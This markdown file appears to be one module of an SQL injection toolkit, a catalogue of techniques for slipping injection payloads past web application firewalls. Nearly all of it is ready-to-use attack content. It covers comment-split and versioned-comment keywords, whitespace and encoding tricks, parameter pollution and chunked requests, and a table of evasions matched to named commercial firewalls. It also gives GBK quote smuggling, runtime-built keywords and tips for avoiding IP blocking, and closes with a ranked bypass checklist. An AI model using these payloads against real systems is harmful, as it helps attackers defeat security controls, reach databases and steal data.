# WAF / filter evasion — the complete catalogue

A WAF blocks on *shapes*: keywords, character pairs, encodings it
never decoded. Evasion is systematic: name exactly WHICH token is
blocked (send the stripped pieces one at a time), then apply the
transform that survives. This file is the transform catalogue;
`detection.md` phase 11 is how you confirm a WAF is the blocker.

First — isolate the blocked token:

```text
id=1 UNION          -> 403?  "UNION"  is the trigger
id=1 SELECT         -> 403?  "SELECT" is the trigger
id=1 UNION SELECT   -> 403 but each alone ok -> the PAIR is the rule
id=1 ' AND          -> 403?  quote+AND proximity
id=1 --             -> 403?  comment marker
```

Then pick a transform for THAT token from the sections below.

---

## 1. Comment surgery (works on every DBMS)

### Inline comment as keyword splitter

```text
UN/**/ION SEL/**/ECT
UNI/**/ON/**/SEL/**/ECT
ORDER/**/BY
FRO/**/M
WHER/**/E
UP/**/DATE
SLEE/**/P(3)
UNION/*random comment text*/SELECT
UNION/*!@#$%^&*()*/SELECT
```

### MySQL versioned comments — execute on MySQL only

```sql
/*!UNION*/ /*!SELECT*/                  -- runs UNION SELECT on MySQL
/*!50000UNION*/ /*!50000SELECT*/        -- only if version >= 5.0
/*!80000VERSION()*/                     -- MySQL 8+ only
/*!12345 this is not a comment */       -- any 5 digits
UNION/*!50000SELECT*/1,2,3-- -
```

WAFs that don't parse `/*!...*/` as executable miss the keyword
entirely — the single most reliable MySQL bypass.

### Trailing comment kills

```sql
' UNION SELECT 1,2,3-- -            -- standard (needs space after --)
' UNION SELECT 1,2,3--%20           -- URL form
' UNION SELECT 1,2,3--%0a           -- newline terminates comment
' UNION SELECT 1,2,3-- -x           -- any junk after space ok
' UNION SELECT 1,2,3%23             -- '#'
' UNION SELECT 1,2,3;%00            -- semicolon+NUL
' UNION SELECT 1,2,3/**/            -- block comment as terminator
' UNION SELECT 1,2,3/*anything*/    -- same
```

If `--` is filtered, the comment-vs-tail problem is often avoided by
closing the query instead of commenting it out:

```sql
' UNION SELECT 'x','y','z'           -- no comment, balanced quotes
' UNION SELECT 1,2,3 LIMIT 1        -- ends legally
') UNION SELECT 1,2,3               -- closed paren
' UNION SELECT 1,2,3 FROM dual WHERE '1'='1
```

---

## 2. Whitespace alternatives

`%20` is not the only separator a query parser accepts:

| Byte | Char | MySQL | PG | MSSQL | Oracle | SQLite |
|---|---|---|---|---|---|---|
| %09 | TAB | ✓ | ✓ | ✓ | ✓ | ✓ |
| %0A | LF | ✓ | ✓ | ✓ | ✓ | ✓ |
| %0B | VT | ✓ | ✓ | ✓ | ? | ? |
| %0C | FF | ✓ | ✓ | ✓ | ? | ? |
| %0D | CR | ✓ | ✓ | ✓ | ✓ | ? |
| %A0 | NBSP | ✓ | ? | ✓ | ? | ? |
| %20 | space | ✓ | ✓ | ✓ | ✓ | ✓ |
| /**/ | comment | ✓ | ✓ | ✓ | ✓ | ✓ |
| () | parens | ✓* | ✓* | ✓* | ✓* | ✓* |

\* parens replace SOME spaces: `UNION(SELECT(1),NULL)`,
`AND(1)=(1)`, `WHERE(1)=(1)` — no spaces at all:

```text
'UNION(SELECT(NULL))FROM(dual)WHERE(1)=(1)-- -
'AND(ASCII(SUBSTRING(user(),1,1)))>100-- -
```

Form-feed %0C is the classic ModSecurity-dodger; VT %0B the sleeper
that survives most regexes.

---

## 3. Case + keyword mangling

```text
UnIoN, sElEcT, oRdEr By, FrOm
uNion all sElect
UNION%20ALL%20SELECT
```

Case-insensitive matching is the norm — this beats lazy WAFs only;
real ones normalize. Better: split keywords across the WAF's own
tokenisation:

```text
UNION SELECT       -> UNI ON SEL ECT won't match — but also won't parse
UNION/**/SELECT    -> parsed as two tokens by DB, one "word" to regex
UNION%0ASELECT     -> newline separator
UNION%0DSELECT     -> CR separator
```

Equivalents that dodge keyword rules entirely:

| Blocked | Try |
|---|---|
| `UNION` | `UNION ALL`, `UNION DISTINCT`, `UNION(SELECT` |
| `SELECT` | `(SELECT`, `SE/**/LECT`, `/*!50000SELECT*/` |
| `FROM` | `FROM`, `FROM x WHERE` reordered, `FrOm` |
| `WHERE` | `WHERE`, `HAVING`, `GROUP BY`, `LIMIT` |
| `ORDER BY` | `ORDER/**/BY`, `GROUP BY` (same probe), `ORDER SIBLINGS BY` |
| `AND` | `&&`, `AND`, `OR NOT`, `LIKE`, `REGEXP`, `IN`, `BETWEEN` |
| `OR` | `\|\|`, `OR`, `XOR`, `AND NOT` |
| `=` | `LIKE`, `REGEXP`, `RLIKE`, `IN`, `BETWEEN x AND y`, `<=>` |
| `>` `<` | `IN()`, `BETWEEN`, `GREATEST(a,b)=a`, `LEAST(a,b)=b` |
| `SLEEP` | `BENCHMARK(n,SHA1('x'))`, `pg_sleep`, heavy joins |
| `IF` | `CASE WHEN c THEN a ELSE b END`, `IIF()` (MSSQL), `ELT()` (MySQL) |
| `SUBSTRING` | `SUBSTR`, `MID`, `LEFT`, `RIGHT`, `LPAD`, `RPAD`, `INSERT(str,...)` |
| `ASCII` | `ORD`, `UNICODE` (MSSQL), `CONV(HEX(c),16,10)`, `INSTR` |
| `CONCAT` | `\|\|`, `CONCAT_WS`, `+` (MSSQL) |
| `GROUP_CONCAT` | `string_agg`, `FOR XML PATH`, `listagg`, `xmlagg` |
| `DATABASE()` | `DB_NAME()`, `current_database()`, `schema()`, `SYS_CONTEXT('USERENV','DB_NAME')` |
| `USER()` | `current_user`, `system_user`, `session_user`, `SYSTEM_USER`, `SUSER_SNAME()` |
| `VERSION()` | `@@version`, `version()`, `v$version`, `sqlite_version()` |
| `LOAD_FILE` | `OPENROWSET(BULK..)`, `pg_read_file`, `UTL_FILE`, `xp_dirtree` |
| `INFORMATION_SCHEMA` | `sys.*`, `pg_*`, `sqlite_master`, `all_*`, `user_*` catalog views |
| `'` (quote) | `CHAR(39)`, `0x27`, `$$..$$` (PG), `q'[..]'` (Oracle q-quoting), hex literals |
| `--` | `#`, `/*..*/`, `;%00`, closing the query cleanly (§1) |
| ` ` (space) | §2 entire table |

---

## 4. Encoding layers

WAFs often decode ONE layer — double-encode to pass through:

```text
single-URL:   %27 %20 %3D %2D%2D
double-URL:   %2527 %2520 %253D %252D%252D      (decodes to single)
              %2527%2520OR%25201%253D1-- -
unicode-esc:  %u0027 %u0031 %uFF07 (full-width)  (IIS-era WAFs)
utf-16be:     %FF%27 %00%27
overlong-utf8: %C0%A7 for ', %E0%80%A7           (old parsers)
html-entity:  &#39; &quot; &#x27; &#x3D;
              (only if the app HTML-decodes before querying)
hex literal:  'a' = 0x61 — quotes gone:
              ' OR 0x617a7a7a7a='zzzz'-- -
              ' AND 1=1 UNION SELECT 0x61646d696e-- -   -- 'admin'
null byte:    %00 truncates some WAF parsers mid-string
              ' UNION SE%00LECT  -- C-strings stop at NUL
raw unicode:  'admin' passed as \u0061\u0064... in JSON body
              (decodes AFTER WAF inspection in some stacks)
```

JSON bodies specifically: `{"id":"\u0027 OR 1=1-- -"}` — JSON `\u`
decoding happens inside the app, after most WAF layers.

Charset games:

```text
?charset=utf-7   Content-Type trickery on some ASP stacks
?charset=utf-16  — quote becomes %FF%27 shape
Content-Type: application/x-www-form-urlencoded;charset=ibm037
    — EBCDIC encoding the whole body (IIS/Apache oddity)
```

---

## 5. HTTP-level evasion (before SQL even parses)

- **Parameter pollution (HPP):**

  ```text
  id=1&id='UNION SELECT'
  id=1'UNION SELECT&id=x    — WAF sees param1='1\'UNION', param2='x';
                             app concatenates → 1'UNION SELECTx' nope—
                             depends on join rule: ASP/IIS joins with ,
                             PHP takes LAST, Apache takes FIRST
  ```

- **Method switching:** GET filtered but POST not, or vice versa —
  also `PUT`/`PATCH`/`DELETE`/`OPTIONS` bodies carrying the param
  hit parsers differently.
- **Content-Type switching:** `application/json` bodies often
  bypass form-urlencoded rules entirely — same param name, JSON
  wrapper.
- **multipart/form-data:** WAFs parse multipart poorly — `filename=`
  and `name=` fields carry the payload inside a boundary block.
- **chunked transfer-encoding:** split the payload across chunk
  boundaries — `UNI` + `ON` lands in separate chunks; WAF sees
  parts, app reassembles.
- **HTTP/0.9 or downgrade:** rare, mostly IIS-era.
- **Trailing junk params:** `id=1&a=x&a=x&...&a=x` — 100 dummy
  params push the real one past the WAF's param-count limit.
- **Path injection:** `/page/id/1'%20UNION` — param inside the path
  segment; some WAFs only inspect the query string.
- **Header injection:** `X-Forwarded-For: payload` when the value is
  logged/queried server-side — WAF inspects it less often.
- **Referer/User-Agent** — same reasoning.
- **Cookie** — `Cookie: prefs=id'UNION` — WAFs that ignore Cookie
  headers entirely exist in the wild.

---

## 6. Syntax-torture evasion (payload shapes that parse weird)

```text
!keyword            MySQL: !keyword() → NOT keyword() but still fn call
'='                  nullary comparisons
%25s                 %s format specifiers hitting printf-style builders
{`x`}                MySQL identifier braces
[ x ]                MSSQL identifier brackets
"x"                  ANSI_QUOTES off vs on — quote-type confusion
`                    backtick identifier vs string confusion
0e123                scientific notation — "0e123" is a valid number,
                     so '0e1'+'x' = 1 (MySQL) — regexes that require
                     \d miss it
0x61                 hex literals in comparisons
N'...'               MSSQL nvarchar prefix
E'...'               PG escape-string prefix
$$...$$              PG dollar-quoting — ' $$hello$$ ' is a string
q'[...]'             Oracle alternative quoting: q'[it's fine]'
'||'                 concat-joining quote pieces: 'a'||'dmin' == 'admin'
                     (builds keyword substrings INSIDE strings)
```

Deep trick — build blocked words INSIDE strings then concat:

```sql
' UNION SELECT 'adm'||'in'-- -        -- 'admin' never appears literal
' UNION SELECT char(117)||char(115)||char(101)||char(114)-- -  -- 'user'
' UNION SELECT 0x75736572-- -          -- 'user' as hex
' UNION SELECT unhex(75736572)-- -     -- MySQL unhex
' UNION SELECT to_char(3591393840,'XXXXXX')-- -                  -- Oracle num→hex
' UNION SELECT cast(0x61646d696e as char)-- -
' UNION SELECT decode('dGVzdA==','base64')-- -                   -- Oracle decode
```

---

## 7. WAF-specific fingerprints + known evasions

| WAF | Tell | Reliable evasion |
|---|---|---|
| ModSecurity CRS | `Mod_Security`, `OWASP_CRS`, 403 + rule id | %0C FF whitespace, `/*!` comments, JSON bodies, HPP, double-encode |
| Cloudflare | `cf-ray`, `Attention Required` | HPP, chunked encoding, utf-8 oddities, comment-split keywords, JSON |
| AWS WAF | `AWS WAF` body | comment split, overlong UTF-8, parameter pollution |
| Imperva/Incapsula | `incap_ses`, `visid_incap` | chunked, HPP, unicode whitespace |
| Akamai Kona | `Reference #`, akamai headers | double-encode, tab/newline sep, multipart |
| F5 BIG-IP ASM | `The requested URL was rejected` | HPP, encoding layers, method switching |
| Barracuda | `barra` cookies | comment split, case mixing |
| Sucuri | `sucuri_*`, Access Denied page | URL-encode everything twice, headers |
| Wordfence (WP) | `wordfence` cookies/pages | JSON body, `/*! */`, hex literals |
| libinjection (generic) | sudden 400s on punctuation | `&&`/`||` forms, `UNION(SELECT` parens, function calls over keywords |
| FortiWeb | `.fgd` urls | chunked, HPP |
| Azure Front Door | `x-azure-ref` | double-encode, `+` vs %20 confusion |

Real check: the WAF's block page often leaks its name — read it.

---

## 8. Regex-defeating arithmetic (MySQL)

WAFs that demand `\d` around keywords miss the number forms:

```sql
' OR 0x31=0x31-- -              -- hex number, no quotes
' OR 0e0=0e0-- -                -- scientific zero
' OR .1e1=1.0-- -               -- decimal notation
' OR 1=1#                       -- '#' comment, no -- needed
' OR true#                      -- literal
' OR 'x'='x'#                   -- simplest
' OR ''='#                      -- empty-string tautology
' OR ('a')=('a')-- -            -- parens everywhere
' OR (select'1')='1'-- -        -- select-as-value
```

---

## 9. JSON / GraphQL specific

```json
{"id":"1' UNION SELECT NULL-- -"}
{"id":["1' UNION SELECT NULL-- -"]}          -- array wrapper confuses parsers
{"id":{"$gt":""}, "x":"' OR 1=1-- -"}
{"search":"a' UNION SELECT NULL-- -"}
{"filter":"\u0027 OR 1=1-- -"}                -- \u escapes decoded late
{"q":"a'+UNION+SELECT+NULL-- -"}              -- '+' decoded as space by app?
```

GraphQL: same, inside `variables` and inside the query string —
introspection `__schema` `__type` is usually allowed even on WAFed
deployments.

---

## 10. Multi-byte and wide-char tricks (MySQL)

GBK/Big5 multi-byte charset confusion — the `%bf'` class:

```text
%bf%27  -> app escapes ' to \' ; GBK reads %bf%5c as one char
         -> the ' escapes unescaped → quote lands live
%bf%5c  same shape — the slash gets eaten as trailing byte
```

Only fires when the app converts charset server-side (PHP mysql_
functions with `SET NAMES gbk` was the canonical victim) — rare now,
still shows up in CTF.

---

## 11. Database-native decode tricks (last resort)

When the payload can sit inside a string the DB decodes:

```sql
-- MySQL: build keywords at runtime
SET @x = 0x554e494f4e2053454c454354; PREPARE s FROM @x; EXECUTE s;
-- stacked only, but the string 'UNION SELECT' never appears
EXECUTE IMMEDIATE ... (Oracle/MSSQL dynamic SQL same idea)
EXEC sp_executesql N'SELECT ...'; EXEC('SEL'+'ECT 1');   -- MSSQL
' AND extractvalue(1,concat(0x7e,(SELECT unhex('...') )))-- -
```

`EXEC('SEL'+'ECT')` class tricks work inside stacked MSSQL; the
runtime-built keyword bypasses static keyword filters entirely.

---

## 12. When the WAF learns (adaptive blocking)

Symptom: your first payload 403s; then even `id=1` 403s for a
while — the WAF escalated to IP blocking. Counter-discipline:

- Slow down; 1 req / 2-5 s keeps under rate thresholds.
- Rotate nothing — rotation looks like an attack; instead minimise
  request count (UNION or error channel over blind loops).
- Prefer ONE OOB request (`oob.md`) over 500 blind probes.
- If you're escalating to 403 on everything — it's a tarpit:
  wait, or come back from another interface.

---

## 13. Bypass attempt budget

WAF bypass is a ranked checklist, not a research project — work it
in this order:

```text
1. comment-split keywords            UN/**/ION  SEL/**/ECT
2. whitespace                        %09 %0A %0C /**/
3. keyword synonyms                  && for AND, like for =, substr for substring
4. case mixing                       UnIoN
5. url-encode the payload           %27%20...
6. double-encode                     %2527...
7. JSON/multipart body move
8. HPP param split
9. versioned comments (MySQL)        /*!50000...*/
10. quote elimination               hex literals, char(), dollar-quote
11. chunked encoding / method switch
12. runtime keyword building        (stacked only)
```

After two failed families on the same payload, the WAF is probably
rules-complete for that shape — change CHANNEL (boolean → time →
oob) rather than payload #13.
